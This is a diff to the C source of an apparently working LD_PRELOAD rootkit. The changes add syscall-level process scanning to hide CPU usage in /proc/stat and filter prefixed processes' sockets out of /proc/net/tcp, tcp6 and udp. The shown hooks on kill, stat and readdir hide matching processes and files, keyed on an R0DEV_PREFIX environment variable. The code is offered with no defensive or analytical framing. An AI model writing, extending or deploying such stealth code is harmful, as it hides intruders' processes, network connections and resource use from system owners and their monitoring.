@@ -56,39 +56,57 @@ static int pid_has_prefix(int pid) {
     return has_prefix(buf);
 }
 
+// === CPU HIDING ===
+
 static long cach_ut = 0, cach_st = 0;
 static time_t cach_time = 0;
 
 static void refresh_cache(void) {
     cach_ut = cach_st = 0;
-    DIR *d = opendir("/proc");
-    if (!d) return;
-    struct dirent *e;
-    while ((e = readdir(d)) != NULL) {
-        char *end;
-        long pid = strtol(e->d_name, &end, 10);
-        if (*end != '\0' || pid <= 0) continue;
-        if (!pid_has_prefix((int)pid)) continue;
-        char path[64];
-        snprintf(path, sizeof(path), "/proc/%ld/stat", pid);
-        int fd = real_open(path, O_RDONLY);
-        if (fd < 0) continue;
-        char buf[512] = {0};
-        real_read(fd, buf, sizeof(buf) - 1);
-        close(fd);
-        long u, s;
-        if (sscanf(buf, "%*d %*s %*c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u %lu %lu", &u, &s) >= 2) {
-            cach_ut += u; cach_st += s;
+    int fd = syscall(SYS_open, "/proc", O_RDONLY | O_DIRECTORY, 0);
+    if (fd < 0) return;
+    char buf[16384];
+    int n;
+    while ((n = syscall(SYS_getdents64, fd, buf, sizeof(buf))) > 0) {
+        off_t off = 0;
+        while (off < n) {
+            struct dirent64 *de = (struct dirent64 *)(buf + off);
+            char *end;
+            long pid = strtol(de->d_name, &end, 10);
+            if (*end == '\0' && pid > 0) {
+                char path[64];
+                snprintf(path, sizeof(path), "/proc/%ld/cmdline", pid);
+                int cf = syscall(SYS_open, path, O_RDONLY, 0);
+                if (cf >= 0) {
+                    char cb[256] = {0};
+                    syscall(SYS_read, cf, cb, sizeof(cb) - 1);
+                    syscall(SYS_close, cf);
+                    if (has_prefix(cb)) {
+                        char sp[64];
+                        snprintf(sp, sizeof(sp), "/proc/%ld/stat", pid);
+                        int sf = syscall(SYS_open, sp, O_RDONLY, 0);
+                        if (sf >= 0) {
+                            char sb[512] = {0};
+                            syscall(SYS_read, sf, sb, sizeof(sb) - 1);
+                            syscall(SYS_close, sf);
+                            long u, s;
+                            if (sscanf(sb, "%*d %*s %*c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u %lu %lu", &u, &s) >= 2) {
+                                cach_ut += u; cach_st += s;
+                            }
+                        }
+                    }
+                }
+            }
+            off += de->d_reclen;
         }
     }
-    closedir(d);
+    syscall(SYS_close, fd);
     cach_time = time(NULL);
 }
 
 static char *get_modified_stat(void) {
     time_t now = time(NULL);
     if (now - cach_time > 5) refresh_cache();
-
     int fd = real_open("/proc/stat", O_RDONLY);
     if (fd < 0) return NULL;
     char *buf = malloc(16384);
@@ -97,7 +115,6 @@ static char *get_modified_stat(void) {
     close(fd);
     if (n <= 0) { free(buf); return NULL; }
     buf[n] = 0;
-
     if (cach_ut + cach_st > 0) {
         char *cpu_line = strstr(buf, "cpu ");
         if (cpu_line && (cpu_line == buf || cpu_line[-1] == '\n')) {
@@ -115,6 +132,134 @@ static char *get_modified_stat(void) {
     }
     return buf;
 }
+
+// === NETWORK CONNECTION HIDING ===
+
+static int is_net_tcp_path(const char *path) {
+    if (!path) return 0;
+    return strcmp(path, "/proc/net/tcp") == 0 ||
+           strcmp(path, "/proc/net/tcp6") == 0 ||
+           strcmp(path, "/proc/net/udp") == 0;
+}
+
+
+
+static int get_hidden_inodes(unsigned long *inodes, int max) {
+    int count = 0;
+    int fd = syscall(SYS_open, "/proc", O_RDONLY | O_DIRECTORY, 0);
+    if (fd < 0) return 0;
+    char buf[16384];
+    int n;
+    while ((n = syscall(SYS_getdents64, fd, buf, sizeof(buf))) > 0 && count < max) {
+        off_t off = 0;
+        while (off < n && count < max) {
+            struct dirent64 *de = (struct dirent64 *)(buf + off);
+            char *end;
+            long pid = strtol(de->d_name, &end, 10);
+            if (*end == '\0' && pid > 0) {
+                char cmdline[64];
+                snprintf(cmdline, sizeof(cmdline), "/proc/%ld/cmdline", pid);
+                int cf = syscall(SYS_open, cmdline, O_RDONLY, 0);
+                if (cf >= 0) {
+                    char cb[256] = {0};
+                    syscall(SYS_read, cf, cb, sizeof(cb) - 1);
+                    syscall(SYS_close, cf);
+                    if (has_prefix(cb)) {
+                        char fdpath[64];
+                        snprintf(fdpath, sizeof(fdpath), "/proc/%ld/fd", pid);
+                        int fdf = syscall(SYS_open, fdpath, O_RDONLY | O_DIRECTORY, 0);
+                        if (fdf >= 0) {
+                            char fdbuf[4096];
+                            int fn;
+                            while ((fn = syscall(SYS_getdents64, fdf, fdbuf, sizeof(fdbuf))) > 0 && count < max) {
+                                off_t foff = 0;
+                                while (foff < fn && count < max) {
+                                    struct dirent64 *fde = (struct dirent64 *)(fdbuf + foff);
+                                    if (strcmp(fde->d_name, ".") != 0 && strcmp(fde->d_name, "..") != 0) {
+                                        char link[256] = {0};
+                                        char linkpath[384];
+                                        snprintf(linkpath, sizeof(linkpath), "/proc/%ld/fd/%s", pid, fde->d_name);
+                                        ssize_t l = readlink(linkpath, link, sizeof(link) - 1);
+                                        if (l > 0) {
+                                            link[l] = 0;
+                                            if (strncmp(link, "socket:[", 8) == 0) {
+                                                inodes[count++] = strtoul(link + 8, NULL, 10);
+                                            }
+                                        }
+                                    }
+                                    foff += fde->d_reclen;
+                                }
+                            }
+                            syscall(SYS_close, fdf);
+                        }
+                    }
+                }
+            }
+            off += de->d_reclen;
+        }
+    }
+    syscall(SYS_close, fd);
+    return count;
+}
+
+static char *filter_net_tcp_content(const char *content, size_t len, size_t *new_len) {
+    unsigned long inodes[256];
+    int nin = get_hidden_inodes(inodes, 256);
+    if (nin == 0) return NULL;
+
+    char *result = malloc(len + 1);
+    if (!result) return NULL;
+
+    const char *p = content;
+    const char *end = content + len;
+    char *out = result;
+    int line = 0;
+
+    while (p < end) {
+        const char *nl = memchr(p, '\n', end - p);
+        size_t llen = nl ? (size_t)(nl - p) : (size_t)(end - p);
+
+        if (line == 0) {
+            memcpy(out, p, llen + 1);
+            out += llen + 1;
+        } else {
+            int field = 0, in_field = 0;
+            const char *inode_start = NULL;
+            int hide = 0;
+
+            for (const char *c = p; c < p + llen; c++) {
+                if (*c == ' ' || *c == '\t') {
+                    in_field = 0;
+                } else if (!in_field) {
+                    in_field = 1;
+                    field++;
+                    if (field == 10) inode_start = c;
+                }
+            }
+
+            if (inode_start) {
+                unsigned long ino = strtoul(inode_start, NULL, 10);
+                for (int i = 0; i < nin; i++) {
+                    if (inodes[i] == ino) { hide = 1; break; }
+                }
+            }
+
+            if (!hide) {
+                memcpy(out, p, llen + 1);
+                out += llen + 1;
+            }
+        }
+        line++;
+        p += llen;
+        if (*p == '\n') p++;
+    }
+
+    *out = 0;
+    if (new_len) *new_len = (size_t)(out - result);
+    return result;
+}
+
+// === READDIR HOOKS ===
 
 struct dirent *readdir(DIR *dirp) {
     if (!real_readdir) real_readdir = dlsym(RTLD_NEXT, "readdir");
@@ -148,79 +293,176 @@ struct dirent64 *readdir64(DIR *dirp) {
     return e;
 }
 
+// === OPEN HOOKS ===
+
+static int openproc_fallback(const char *path, int flags, va_list ap, int use_at) {
+    mode_t m = 0;
+    if (flags & O_CREAT) { va_list ap2; va_copy(ap2, ap); m = va_arg(ap2, mode_t); va_end(ap2); }
+    if (use_at) return real_openat(AT_FDCWD, path, flags, m);
+    return real_open(path, flags, m);
+}
+
 int open(const char *path, int flags, ...) {
     if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
-    if (strcmp(path, "/proc/stat") == 0 && !(flags & O_WRONLY)) {
-        char *content = get_modified_stat();
-        if (content) {
-            int fd = syscall(SYS_memfd_create, ".stat", 0);
-            if (fd >= 0) {
-                write(fd, content, strlen(content));
-                lseek(fd, 0, SEEK_SET);
+    if (!real_read) real_read = dlsym(RTLD_NEXT, "read");
+
+    if (!(flags & O_WRONLY)) {
+        if (strcmp(path, "/proc/stat") == 0) {
+            char *content = get_modified_stat();
+            if (content) {
+                int fd = syscall(SYS_memfd_create, ".stat", 0);
+                if (fd >= 0) {
+                    write(fd, content, strlen(content));
+                    lseek(fd, 0, SEEK_SET);
+                    free(content);
+                    return fd;
+                }
                 free(content);
-                return fd;
             }
-            free(content);
+        } else if (is_net_tcp_path(path)) {
+            int rf = real_open(path, flags, 0);
+            if (rf >= 0) {
+                char content[65536];
+                int n = real_read(rf, content, sizeof(content) - 1);
+                close(rf);
+                if (n > 0) {
+                    content[n] = 0;
+                    size_t nl;
+                    char *filtered = filter_net_tcp_content(content, n, &nl);
+                    if (filtered) {
+                        int mfd = syscall(SYS_memfd_create, ".nettcp", 0);
+                        if (mfd >= 0) {
+                            write(mfd, filtered, nl);
+                            lseek(mfd, 0, SEEK_SET);
+                            free(filtered);
+                            return mfd;
+                        }
+                        free(filtered);
+                    } else {
+                    }
+                }
+            }
         }
     }
-    mode_t m = 0;
-    if (flags & O_CREAT) { va_list ap; va_start(ap, flags); m = va_arg(ap, mode_t); va_end(ap); }
-    return real_open(path, flags, m);
+
+    va_list ap; va_start(ap, flags);
+    int ret = openproc_fallback(path, flags, ap, 0);
+    va_end(ap);
+    return ret;
 }
 
 int openat(int dirfd, const char *path, int flags, ...) {
     if (!real_openat) real_openat = dlsym(RTLD_NEXT, "openat");
-    if (strcmp(path, "/proc/stat") == 0 && !(flags & O_WRONLY)) {
-        char *content = get_modified_stat();
-        if (content) {
-            int fd = syscall(SYS_memfd_create, ".stat", 0);
-            if (fd >= 0) {
-                write(fd, content, strlen(content));
-                lseek(fd, 0, SEEK_SET);
+    if (!real_read) real_read = dlsym(RTLD_NEXT, "read");
+
+    if (!(flags & O_WRONLY)) {
+        if (strcmp(path, "/proc/stat") == 0) {
+            char *content = get_modified_stat();
+            if (content) {
+                int fd = syscall(SYS_memfd_create, ".stat", 0);
+                if (fd >= 0) {
+                    write(fd, content, strlen(content));
+                    lseek(fd, 0, SEEK_SET);
+                    free(content);
+                    return fd;
+                }
                 free(content);
-                return fd;
             }
-            free(content);
+        } else if (is_net_tcp_path(path)) {
+            int rf = real_openat(dirfd, path, flags, 0);
+            if (rf >= 0) {
+                char content[65536];
+                int n = real_read(rf, content, sizeof(content) - 1);
+                close(rf);
+                if (n > 0) {
+                    content[n] = 0;
+                    size_t nl;
+                    char *filtered = filter_net_tcp_content(content, n, &nl);
+                    if (filtered) {
+                        int mfd = syscall(SYS_memfd_create, ".nettcp", 0);
+                        if (mfd >= 0) {
+                            write(mfd, filtered, nl);
+                            lseek(mfd, 0, SEEK_SET);
+                            free(filtered);
+                            return mfd;
+                        }
+                        free(filtered);
+                    }
+                }
+            }
         }
     }
-    mode_t m = 0;
-    if (flags & O_CREAT) { va_list ap; va_start(ap, flags); m = va_arg(ap, mode_t); va_end(ap); }
-    return real_openat(dirfd, path, flags, m);
+
+    va_list ap; va_start(ap, flags);
+    int ret = openproc_fallback(path, flags, ap, 1);
+    va_end(ap);
+    return ret;
 }
 
 FILE *fopen(const char *path, const char *mode) {
     if (!real_fopen) real_fopen = dlsym(RTLD_NEXT, "fopen");
-    if (strcmp(path, "/proc/stat") == 0 && mode[0] == 'r') {
-        time_t now = time(NULL);
-        if (now - cach_time > 5) refresh_cache();
+    if (!real_read) real_read = dlsym(RTLD_NEXT, "read");
 
-        FILE *f = real_fopen(path, mode);
-        if (!f) return f;
+    if (mode[0] == 'r') {
+        if (strcmp(path, "/proc/stat") == 0) {
+            time_t now = time(NULL);
+            if (now - cach_time > 5) refresh_cache();
 
-        char buf[8192];
-        size_t n = fread(buf, 1, sizeof(buf) - 1, f);
-        buf[n] = 0;
+            FILE *f = real_fopen(path, mode);
+            if (!f) return f;
 
-        if (cach_ut + cach_st > 0) {
-            char *cpu_line = strstr(buf, "cpu ");
-            if (cpu_line && (cpu_line == buf || cpu_line[-1] == '\n')) {
-                long u, ns, s, i, w, x, y, z;
-                if (sscanf(cpu_line, "cpu  %ld %ld %ld %ld %ld %ld %ld %ld",
-                           &u, &ns, &s, &i, &w, &x, &y, &z) >= 4) {
-                    u -= cach_ut; if (u < 0) u = 0;
-                    s -= cach_st; if (s < 0) s = 0;
-                    char nl[256];
-                    int nlen = snprintf(nl, sizeof(nl),
-                        "cpu  %ld %ld %ld %ld %ld %ld %ld %ld\n", u, ns, s, i, w, x, y, z);
-                    memcpy(cpu_line, nl, nlen);
+            char buf[8192];
+            size_t n = fread(buf, 1, sizeof(buf) - 1, f);
+            fclose(f);
+            buf[n] = 0;
+
+            if (cach_ut + cach_st > 0) {
+                char *cpu_line = strstr(buf, "cpu ");
+                if (cpu_line && (cpu_line == buf || cpu_line[-1] == '\n')) {
+                    long u, ns, s, i, w, x, y, z;
+                    if (sscanf(cpu_line, "cpu  %ld %ld %ld %ld %ld %ld %ld %ld",
+                               &u, &ns, &s, &i, &w, &x, &y, &z) >= 4) {
+                        u -= cach_ut; if (u < 0) u = 0;
+                        s -= cach_st; if (s < 0) s = 0;
+                        char nl[256];
+                        int nlen = snprintf(nl, sizeof(nl),
+                            "cpu  %ld %ld %ld %ld %ld %ld %ld %ld\n", u, ns, s, i, w, x, y, z);
+                        memcpy(cpu_line, nl, nlen);
+                    }
                 }
             }
-        }
 
-        fclose(f);
-        FILE *tmp = tmpfile();
-        if (tmp) { fwrite(buf, 1, strlen(buf), tmp); rewind(tmp); return tmp; }
-        return NULL;
+            FILE *tmp = tmpfile();
+            if (tmp) { fwrite(buf, 1, strlen(buf), tmp); rewind(tmp); return tmp; }
+            return NULL;
+        } else if (is_net_tcp_path(path)) {
+            int rfd = syscall(SYS_open, path, O_RDONLY, 0);
+            if (rfd < 0) return real_fopen(path, mode);
+            char buf[131072];
+            int total = 0;
+            while (total < (int)sizeof(buf) - 1) {
+                int n = syscall(SYS_read, rfd, buf + total, sizeof(buf) - total - 1);
+                if (n <= 0) break;
+                total += n;
+            }
+            syscall(SYS_close, rfd);
+            if (total > 0) {
+                buf[total] = 0;
+                size_t nl;
+                char *filtered = filter_net_tcp_content(buf, total, &nl);
+                if (filtered) {
+                    int mfd = syscall(SYS_memfd_create, ".nettcp", 0);
+                    if (mfd >= 0) {
+                        syscall(SYS_write, mfd, filtered, nl);
+                        lseek(mfd, 0, SEEK_SET);
+                        free(filtered);
+                        return fdopen(mfd, "r");
+                    }
+                    free(filtered);
+                }
+            }
+            return real_fopen(path, mode);
+        }
     }
     return real_fopen(path, mode);
 }
@@ -256,10 +498,21 @@ ssize_t read(int fd, void *buf, size_t count) {
                     }
                 }
             }
+        } else if (strstr(link, "/proc/net/tcp") || strstr(link, "/proc/net/tcp6") || strstr(link, "/proc/net/udp")) {
+            size_t nl;
+            char *filtered = filter_net_tcp_content(buf, ret, &nl);
+            if (filtered) {
+                size_t cp = nl < (size_t)ret ? nl : (size_t)ret;
+                memcpy(buf, filtered, cp);
+                free(filtered);
+                return (ssize_t)cp;
+            }
         }
     }
     return ret;
 }
+
+// === KILL HOOK ===
 
 int kill(pid_t pid, int sig) {
     if (!real_kill) real_kill = dlsym(RTLD_NEXT, "kill");
@@ -267,6 +520,8 @@ int kill(pid_t pid, int sig) {
         return 0;
     return real_kill(pid, sig);
 }
+
+// === STAT HOOKS ===
 
 int stat(const char *path, struct stat *buf) {
     if (!real_stat) real_stat = dlsym(RTLD_NEXT, "stat");
@@ -285,6 +540,8 @@ int fstatat(int dirfd, const char *path, struct stat *buf, int flags) {
     if (has_prefix(path)) { errno = ENOENT; return -1; }
     return real_fstatat(dirfd, path, buf, flags);
 }
+
+// === INIT ===
 
 static void read_prefix_from_env(void) {
     char *env = getenv("R0DEV_PREFIX");
